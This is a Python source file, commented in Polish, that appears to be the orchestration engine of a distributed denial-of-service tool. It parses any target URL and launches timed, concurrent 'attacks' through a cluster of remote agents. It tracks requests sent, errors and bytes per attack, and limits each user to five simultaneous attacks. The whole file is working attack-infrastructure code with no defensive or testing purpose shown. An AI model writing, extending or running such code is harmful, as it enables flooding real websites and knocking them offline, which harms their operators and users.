"""Silnik: orkiestracja klastra + lokalny fallback."""
from __future__ import annotations

import asyncio
import time
import uuid
from urllib.parse import urlparse

from config import Settings
from core.cluster import Cluster
from core.models import Attack, AttackState, Target


class AttackError(Exception):
    pass


def parse_target(raw: str) -> Target:
    raw = raw.strip()
    if not raw.startswith(("http://", "https://")):
        raw = "https://" + raw
    p = urlparse(raw)
    if not p.hostname:
        raise AttackError("Nieprawidlowy adres URL")
    scheme = p.scheme or "https"
    return Target(url=raw, host=p.hostname, port=p.port or (443 if scheme == "https" else 80), scheme=scheme)


class AttackEngine:
    def __init__(self, settings: Settings, cluster: Cluster) -> None:
        self._s = settings
        self._cluster = cluster
        self._active: dict[str, Attack] = {}
        self._tasks: dict[str, asyncio.Task] = {}

    @property
    def active(self) -> dict[str, Attack]:
        return self._active

    def get(self, aid: str) -> Attack | None:
        return self._active.get(aid)

    async def launch(self, target: Target, owner_id: int, duration: int, concurrency: int) -> Attack:
        if len(self._active) >= 5:
            raise AttackError("Limit 5 rownoleglych atakow")
        if not self._cluster.online:
            raise AttackError("Brak zywych agentow")

        attack = Attack(
            id=uuid.uuid4().hex[:8], target=target, owner_id=owner_id,
            duration=duration, concurrency=concurrency, agents=len(self._cluster.online),
        )
        attack.agent_ids = await self._cluster.launch(
            target.url, target.method, duration, concurrency
        )
        self._active[attack.id] = attack
        self._tasks[attack.id] = asyncio.create_task(self._poll(attack))
        return attack

    async def stop(self, aid: str) -> bool:
        a = self._active.get(aid)
        if not a or a.state is not AttackState.RUNNING:
            return False
        a.state = AttackState.STOPPED
        await self._cluster.stop(a.agent_ids)
        t = self._tasks.get(aid)
        if t:
            t.cancel()
        return True

    async def _poll(self, attack: Attack) -> None:
        deadline = time.monotonic() + attack.duration + 5
        try:
            while time.monotonic() < deadline and attack.state is AttackState.RUNNING:
                await asyncio.sleep(1)
                data = await self._cluster.collect()
                for per_agent in data.values():
                    for aid, snap in per_agent.items():
                        if aid in attack.agent_ids.values():
                            attack.stats.merge(
                                snap.get("sent", 0), snap.get("ok", 0),
                                snap.get("errors", 0), snap.get("bytes", 0), snap.get("codes", {}),
                            )
        except asyncio.CancelledError:
            pass
        finally:
            if attack.state is AttackState.RUNNING:
                attack.state = AttackState.FINISHED
            self._active.pop(attack.id, None)
            self._tasks.pop(attack.id, None)
